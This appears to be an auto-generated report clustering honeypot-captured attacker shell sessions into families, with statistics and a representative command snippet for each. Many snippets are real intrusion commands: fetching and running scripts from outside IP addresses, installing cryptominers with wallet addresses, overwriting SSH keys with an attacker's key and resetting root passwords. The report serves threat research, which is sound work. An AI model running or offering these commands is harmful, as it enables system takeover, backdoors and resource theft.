Top operators: [('cd', 4), ('wget', 4), ('curl', 4), ('chmod', 4), ('rm', 4), ('history', 4), ('PH_EXEC_1', 2), ('sh', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0129d0d0e783bb89 | 567dcd0024ef |        7 |               1 |
| 7aff857af4b5e2d7 | e5e896fa573f |        6 |               1 |
| 9782fb0385ecb7c3 | a60620cf1568 |        7 |               1 |
| 9e130f6dca55feed | 91e0a1c9699b |        7 |               1 |

---

## Family 93

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.886 (±0.079)
- **Medoid Archetype**: `a8f9e07826cc8098` (Session: `ac43122c4a15`, n_rows=17)

**Medoid Execution Snippet:**
```text
pkill kitten
pkill YDEdr
pkill ip
pkill xmrig
pkill cnrig
pkill kswapd0
pkill x86_64
pkill x86
cd /tmp
rm -rf config.json
rm -rf kitten
wget http://88.218.17.142/boom.sh
curl -O http://88.218.17.142/boom.sh
busybox wget http://88.218.17.142/boom.sh
chmod 777 *
sh boom.sh
cat /etc/issue ;
```

**Consensus Skeleton (op, conn pairs):**
`[('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('chmod', ';')]`

Top operators: [('kill', 30), ('rm', 7), ('cd', 4), ('wget', 4), ('curl', 4), ('busybox', 4), ('chmod', 4), ('sh', 3), ('cat', 3), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 98e60f3abf86c145 | 2c4df73a8339 |       16 |               1 |
| a8f9e07826cc8098 | ac43122c4a15 |       17 |               1 |
| bc8ad6f2641d3e06 | 1b94f80e2dae |       14 |               1 |
| f4627a6fa2eba89f | 42075cdc786e |       17 |               1 |

---

## Family 44

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.881 (±0.088)
- **Medoid Archetype**: `013decbb361b4878` (Session: `14ae0b2ea750`, n_rows=80)

**Medoid Execution Snippet:**
```text
>/tmp/.l && cd /tmp/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || ./helloworld
>/var/.l && cd /var/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || ./helloworld
>/dev/.l && cd /dev/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || ./helloworld
>/mnt/.l && cd /mnt/
echo -en '\x50\x41\x54\x ...
```

**Consensus Skeleton (op, conn pairs):**
`[('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('rm', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('PH_EXEC_2', ';'), ('chmod', ';')]`

Top operators: [('echo', 207), ('>', 60), ('cd', 56), ('PH_EXEC_1', 56), ('chmod', 12), ('rm', 8), ('cp', 8), ('PH_EXEC_2', 4), ('PH_EXEC_3', 4), ('kill', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 013decbb361b4878 | 14ae0b2ea750 |       80 |               1 |
| a8119f6fd9245cc1 | f8c5d8a9465b |       60 |               1 |
| c4ca4c68ffd5e78f | 8108593b05f8 |       82 |               1 |
| cd3920149a083b8e | cf84780de6fe |       84 |               1 |

---

## Family 48

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.841 (±0.065)
- **Medoid Archetype**: `d443f52e8e6b67d5` (Session: `986325333b9d`, n_rows=4)

**Medoid Execution Snippet:**
```text
uname
uname -a
lscpu | grep Model
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEm ...
```

**Consensus Skeleton (op, conn pairs):**
`[('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('cd', 8), ('uname', 5), ('lscpu', 4), ('grep', 4), ('rm', 4), ('mkdir', 4), ('echo', 4), ('chmod', 4), ('top', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 00764825cd0272e9 | 7cee3086edc7 |        5 |               1 |
| 5391e6f108f2b309 | 4f0bc2599a16 |        3 |               1 |
| d443f52e8e6b67d5 | 986325333b9d |        4 |               1 |
| f34399171e31a860 | 4c3ba5786cdc |        2 |               1 |

---

## Family 33

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.839 (±0.076)
- **Medoid Archetype**: `6722f98e2ea5d2f7` (Session: `b3d9c8d0cd2e`, n_rows=8)

**Medoid Execution Snippet:**
```text
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | cat -n ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('cat', ';'), ('ps', '|'), ('grep', ';'), ('ps', '|'), ('grep', ';'), ('echo', '|'), ('cat', 'EOS')]`

Top operators: [('cat', 8), ('ps', 8), ('grep', 8), ('PH_EXEC_1', 4), ('echo', 4), ('ls', 3), ('ifconfig', 3), ('uname', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2ff8632e58c37447 | 42827783ea0c |        6 |               1 |
| 591ec73e66d482dd | 1ff5ad0f798f |        7 |               1 |
| 6722f98e2ea5d2f7 | b3d9c8d0cd2e |        8 |               1 |
| aac48fc7531c7541 | b07f6bd2e6f7 |        7 |               1 |

---

## Family 152

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 3
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `87f4e3b91e52d0e8` (Session: `d536a265bc33`, n_rows=2)

**Medoid Execution Snippet:**
```text
wget http://dns.cyberium.cc/script/ssh -O- | sh
curl http://dns.cyberium.cc/script/ssh -O- | sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]`

Top operators: [('sh', 6), ('wget', 3), ('curl', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e22c4a5898cf4290 | 64b44a2630c4 |        2 |               2 |
| 87f4e3b91e52d0e8 | d536a265bc33 |        2 |               1 |
| a01c4648adc39405 | 51a6c8a98d42 |        2 |               1 |

---

## Family 88

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.899 (±0.036)
- **Medoid Archetype**: `1c3afe961bd3ce3b` (Session: `2e16a2f1f019`, n_rows=22)

**Medoid Execution Snippet:**
```text
cat /proc/mounts
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>//.a && cd /
>/proc/.a && cd /proc
>/dev/.a && cd /dev
>/run/.a && cd /run
>//.a && cd /
>/dev/shm/.a && cd /dev/shm
>/proc/sys/fs/binfmt_misc/.a && cd /proc/sys/ ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('ftpget', ';'), ('echo', ';')]`

Top operators: [('>', 48), ('cd', 48), ('wget', 6), ('curl', 4), ('cat', 3), ('ftpget', 3), ('echo', 3), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c029d11d82d5323d | 8cfcb58d9b53 |       23 |               2 |
| 1c3afe961bd3ce3b | 2e16a2f1f019 |       22 |               1 |
| 437a75963ddbc64a | 2f70cd703f98 |       21 |               1 |

---

## Family 11

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.867 (±0.094)
- **Medoid Archetype**: `0d3c922b579af426` (Session: `0957126f09d8`, n_rows=2)

**Medoid Execution Snippet:**
```text
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 45dNkjTQGgT77r9AEMyHdCGan5tpuekXaHFhFW99dQ8hUS35oZQEYXddFE52jxVdfUNrAD4ZyZ44BgHfgk5SjHdoLjGdJnQ
curl: option -L not recognized
curl: try 'curl --help' or 'curl --manual' for more information ;
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '|'), ('bash', ';'), ('curl:', ';'), ('curl:', 'EOS')]`

Top operators: [('curl:', 6), ('curl', 3), ('bash', 3), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a2e8f996e1566d34 | 33f6c45433cc |        3 |               2 |
| 0d3c922b579af426 | 0957126f09d8 |        2 |               1 |
| 9d86f4778168840b | 07ca64a08772 |        2 |               1 |

---

## Family 318

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `191f4a69358ae15c` (Session: `9c506b195c8d`, n_rows=2)

**Medoid Execution Snippet:**
```text
nproc
uname -s -n -r -i ;
```

**Consensus Skeleton (op, conn pairs):**
`[('nproc', ';'), ('uname', 'EOS')]`

Top operators: [('nproc', 2), ('uname', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b1bbe9d3ea90fcb4 | 00c707e3736d |        2 |               3 |
| 191f4a69358ae15c | 9c506b195c8d |        2 |               1 |

---

## Family 123

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.889 (±0.000)
- **Medoid Archetype**: `4c373d3ff91750f2` (Session: `90d44c790dbc`, n_rows=4)

**Medoid Execution Snippet:**
```text
echo root:temSpoGXMRGprongtogSgg31337 | chpasswd | bash
nvidia-smi
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1
curl: option -L not recognized
curl: try 'cu ...
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('nvidia-smi', ';'), ('curl', '|'), ('bash', ';'), ('curl:', ';'), ('curl:', 'EOS')]`

Top operators: [('bash', 4), ('curl:', 4), ('echo', 2), ('chpasswd', 2), ('nvidia-smi', 2), ('curl', 2), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4c373d3ff91750f2 | 90d44c790dbc |        4 |               2 |
| a34487a737fa155a | e1bfec2d5398 |        5 |               2 |

---

## Family 79

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.857 (±0.000)
- **Medoid Archetype**: `071ce96a55c1355a` (Session: `3f0ecbf8b8d0`, n_rows=10)

**Medoid Execution Snippet:**
```text
echo root:ds234e31s123tij24jtiu3ji3rg | chpasswd | bash
uname -a
pkill xmrig
pkill cnrig
pkill x86
pkill x86_64
pkill Opera
nvidia-smi
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpm ...
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('uname', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('curl', '|'), ('bash', ';'), ('curl:', ';'), ('curl:', 'EOS')]`

Top operators: [('kill', 10), ('bash', 4), ('curl:', 4), ('echo', 2), ('chpasswd', 2), ('uname', 2), ('nvidia-smi', 2), ('curl', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 071ce96a55c1355a | 3f0ecbf8b8d0 |       10 |               3 |
| 98c5bbe6c2b050db | df66382d8131 |       10 |               1 |

---

## Family 247

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `06563cfd68e67617` (Session: `23484e7853af`, n_rows=10)

**Medoid Execution Snippet:**
```text
echo -e '\x79\x65\x73\x68\x65\x6c\x6f'
cat /bin/echo
cat /proc/mounts
cp /bin/echo //.f && >//.f && echo -e '\x67\x6f\x6f\x64\x77\x72\x69\x74\x65' && chmod 777 //.f
echo -e '\x63\x6d\x64\x67\x6f\x74'
cd //
wget http://2.58.149.116/arm -O- > .f
./.f s.arm
>.f
echo test ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('cat', ';'), ('cat', ';'), ('cp', '&&'), ('>', '&&'), ('echo', '&&'), ('chmod', ';'), ('echo', ';'), ('cd', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 4), ('cat', 2), ('>', 2), ('cp', 1), ('chmod', 1), ('cd', 1), ('wget', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 06563cfd68e67617 | 23484e7853af |       10 |               4 |

---

## Family 91

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `367b9d0f8b900417` (Session: `6c3b8a7274f7`, n_rows=4)

**Medoid Execution Snippet:**
```text
cd /tmp
wget 193.233.202.219/niko
perl niko
rm -rf niko ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('perl', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 3), ('wget', 3), ('perl', 3), ('rm', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 367b9d0f8b900417 | 6c3b8a7274f7 |        4 |               1 |
| 9bbc0d8e03aa6fcc | 6a0450bc4854 |        4 |               1 |
| e178246b0b723d54 | 53fe8776b4bc |        4 |               1 |

---

## Family 201

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4488de2e0a999004` (Session: `726c46b3eb41`, n_rows=2)

**Medoid Execution Snippet:**
```text
sudo hive-passwd dayone1edfjqiyhnh1
sudo pkill Xorg ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sudo', ';'), ('sudo', 'EOS')]`

Top operators: [('sudo', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4488de2e0a999004 | 726c46b3eb41 |        2 |               1 |
| adc83fca99cb20cb | 317fde5ce5d7 |        2 |               1 |
| f328fe37aafa38e7 | 0fd87aa7b80e |        2 |               1 |

---

## Family 85

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.956 (±0.031)
- **Medoid Archetype**: `58d18c71d74bbee0` (Session: `0315d5d00ef8`, n_rows=10)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
curl http://103.162.29.212/Zehir.sh -O
busybox curl http://103.162.29.212/Zehir.sh -O
wget http://103.162.29.212/Zehir.sh -O Zehir.sh
busybox wget http://103.162.29.212/Zehir.sh -O Zehir.sh
sh Zehir.sh
rm -rf Zehir.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('curl', ';'), ('busybox', ';'), ('wget', ';'), ('busybox', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 15), ('sh', 7), ('busybox', 6), ('shell', 3), ('ls', 3), ('curl', 3), ('wget', 3), ('rm', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 58d18c71d74bbee0 | 0315d5d00ef8 |       10 |               1 |
| 871894fc56d17013 | d989b9eeaca0 |       10 |               1 |
| def2f034a5b46782 | 9bd35d2a6332 |       11 |               1 |

---

## Family 122

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.926 (±0.052)
- **Medoid Archetype**: `88fd8042ed5b3b1b` (Session: `9294089047ab`, n_rows=9)

**Medoid Execution Snippet:**
```text
cd /tmp
mkdir .x
cd .x
wget http://20.106.163.35/cnrig
curl -O http://20.106.163.35/cnrig
chmod +x cnrig
mv cnrig systemd
./systemd -o 37.187.95.110:443 -u 8ALdP9yTXenfNjgpm5TrRf7TGoBr8aUKU3kQcu7CLzfVJZYMXTohVb85GrRu7dy8PsTYrcisdG9LdMTmkuPRdZN7CnFsVWB -k --tls -p MinerCox2 -B
echo DONE ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('mkdir', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('mv', ';'), ('PH_EXEC_1', ';'), ('echo', 'EOS')]`

Top operators: [('cd', 6), ('mkdir', 3), ('wget', 3), ('chmod', 3), ('mv', 3), ('PH_EXEC_1', 3), ('echo', 3), ('curl', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 65922d3ef21022de | ebb46c1f7a7c |        8 |               1 |
| 88fd8042ed5b3b1b | 9294089047ab |        9 |               1 |
| ddfd8844d15c7f66 | 292c8078e846 |        9 |               1 |

---

## Family 89

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.889 (±0.079)
- **Medoid Archetype**: `b983fb3305645d8c` (Session: `7e75a992f14d`, n_rows=4)

**Medoid Execution Snippet:**
```text
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 49fJJBi8TxsGB8KB4WCg2ZWNtQNCvAMB4HYkwS31HfVWJwvx5xQw3rpYx7M635ew5TZy4YK5HkLVoJCdE2X57LQiGfy6SgF
sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor
sudo pkill ...
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '|'), ('bash', ';'), ('sudo', ';'), ('sudo', ';'), ('sudo', 'EOS')]`

Top operators: [('sudo', 9), ('bash', 4), ('curl', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b983fb3305645d8c | 7e75a992f14d |        4 |               1 |
| c77ad349855302b9 | 617045c00ba3 |        4 |               1 |
| e7ec178c2295af3c | 01efbdff1d8d |        4 |               1 |

---

## Family 139

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.866 (±0.055)
- **Medoid Archetype**: `53608492fdd49ff3` (Session: `f85dbf920403`, n_rows=13)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
uname
uname -a
lscpu | ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|')]`

Top operators: [('grep', 18), ('uname', 9), ('cat', 8), ('awk', 7), ('wc', 5), ('lscpu', 4), ('head', 4), ('free', 3), ('ls', 3), ('which', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1b0c15efd877a9dd | 9be9c83b8c6e |       13 |               1 |
| 53608492fdd49ff3 | f85dbf920403 |       13 |               1 |
| cea1ab2b35565c8b | 04e88d6ec867 |       15 |               1 |

---

## Family 50

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.862 (±0.058)
- **Medoid Archetype**: `96665d02aab9792b` (Session: `6fcde7a4e348`, n_rows=16)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('rm', ';'), ('rm', ';'), ('kill', ';'), ('kill', ';'), ('echo', ';'), ('kill', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|')]`

Top operators: [('cd', 9), ('rm', 9), ('echo', 9), ('grep', 9), ('kill', 9), ('cat', 6), ('wc', 4), ('awk', 4), ('chattr', 3), ('lockr', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 30f640704da7c374 | cfb880053538 |       18 |               1 |
| 96665d02aab9792b | 6fcde7a4e348 |       16 |               1 |
| edccaec5f6cbbeda | fbd42300d63f |       15 |               1 |

---

## Family 70

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.857 (±0.067)
- **Medoid Archetype**: `d654eb8a3958ae58` (Session: `42f9873833c9`, n_rows=16)

**Medoid Execution Snippet:**
```text
sh
shell
help
busybox
cd /tmp || cd /run || cd /
wget http://194.55.186.241/lolxdbins.sh
chmod 777 lolxdbins.sh
sh lolxdbins.sh
tftp 194.55.186.241 -c get lolxdtftp1.sh
chmod 777 lolxdtftp1.sh
sh lolxdtftp1.sh
tftp -r lolxdtftp2.sh -g 194.55.186.241
chmod 777 lolxdtftp2.sh
sh lolxdtftp2.sh
rm -rf lo ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('help', ';'), ('busybox', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('sh', 12), ('chmod', 9), ('cd', 7), ('tftp', 6), ('rm', 5), ('shell', 3), ('help', 3), ('busybox', 3), ('wget', 3), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6bafc5293ae1cc2e | 0a6d340d2165 |       16 |               1 |
| d654eb8a3958ae58 | 42f9873833c9 |       16 |               1 |
| eb9ac969821e1a8c | edb3cb0d238d |       15 |               1 |

---

## Family 83

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.847 (±0.049)
- **Medoid Archetype**: `21865156a59f048b` (Session: `fcc51b4c4997`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd /tmp
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
wget http://179.43.175.170/putkite/quickr1n.sh
curl -O http://179.43.175.170/putkite ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('curl', '|'), ('bash', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('echo', 'EOS')]`

Top operators: [('curl', 5), ('cd', 3), ('bash', 3), ('wget', 3), ('chmod', 3), ('sh', 3), ('echo', 3), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 21865156a59f048b | fcc51b4c4997 |        7 |               1 |
| 82714f1481c24c22 | ae12c70b4cb1 |        8 |               1 |
| 9451a52c66b4a72f | 5df17cbd13c4 |        6 |               1 |

---

## Family 76

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.833 (±0.047)
- **Medoid Archetype**: `75bef67f646838bf` (Session: `36804d0d092f`, n_rows=5)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
/bin/busybox SATORI ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';')]`

Top operators: [('enable', 3), ('system', 3), ('shell', 3), ('sh', 3), ('busybox', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 45d422995de61299 | 89f63374b63e |        4 |               1 |
| 75bef67f646838bf | 36804d0d092f |        5 |               1 |
| b8e5ba31dda52cf3 | 15c3a5b56203 |        5 |               1 |

---

## Family 32

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.833 (±0.067)
- **Medoid Archetype**: `2e8d2bf6edc844fb` (Session: `07797df17a3e`, n_rows=267)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell
shell
sh
echo -e '\x61\x6E\x7A\x6C\x62'
passwd
cd /tmp || cd /var || cd /dev || cd /etc
cat /bin/ls | more
cat /bin/ls | head -n 1
chmod
echo -ne '\x7F\x45\x4C\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x11\x ...
```

**Consensus Skeleton (op, conn pairs):**
